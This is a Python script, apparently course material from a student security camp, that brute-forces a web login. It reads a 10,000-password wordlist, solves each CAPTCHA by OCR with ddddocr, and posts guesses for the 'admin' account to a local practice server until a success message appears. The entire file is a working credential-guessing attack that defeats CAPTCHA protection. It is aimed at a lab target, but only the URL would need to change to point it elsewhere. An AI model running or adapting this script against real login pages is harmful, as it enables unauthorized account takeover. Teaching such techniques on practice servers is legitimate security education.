import requests
import ddddocr
import time
import random
import os

ocr = ddddocr.DdddOcr()
session = requests.Session()

URL = "http://127.0.0.1:5000/login"
CAPTCHA_URL = "http://127.0.0.1:5000/captcha"
CAPTCHA_PATH = r"C:\Users\hank\OneDrive\桌面\大學\2025資工營\example-code-2025-main\03_選修課二\03_Boom！成為爆破專家的 Day [0]\event_web_captcha\captcha_get.png"

# 載入字典檔（自行準備或替換為 rockyou.txt）
with open(r"03_選修課二\03_Boom！成為爆破專家的 Day [0]\event_web_captcha\xato-net-10-million-passwords-10000.txt", "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

def get_captcha():
    rand_query = str(random.random())
    r = session.get(f"{CAPTCHA_URL}?{rand_query}")
    with open(CAPTCHA_PATH, "wb") as f:
        f.write(r.content)
    with open(CAPTCHA_PATH, "rb") as f:
        return ocr.classification(f.read())

# 開始爆破
for i, password in enumerate(passwords, start=1):
    captcha_text = get_captcha()
    print(f"[{i}] 嘗試密碼: {password} | 驗證碼: {captcha_text}")

    data = {
        "username": "admin",
        "password": password,
        "captcha": captcha_text
    }

    response = session.post(URL, data=data)

    if "You are a hacker" in response.text:
        print(f"🎉 成功登入！密碼: {password} | 驗證碼: {captcha_text}")
        break
    elif "驗證碼錯誤" in response.text:
        print("❌ 驗證碼錯誤，重新嘗試")
    else:
        print("❌ 密碼錯誤")
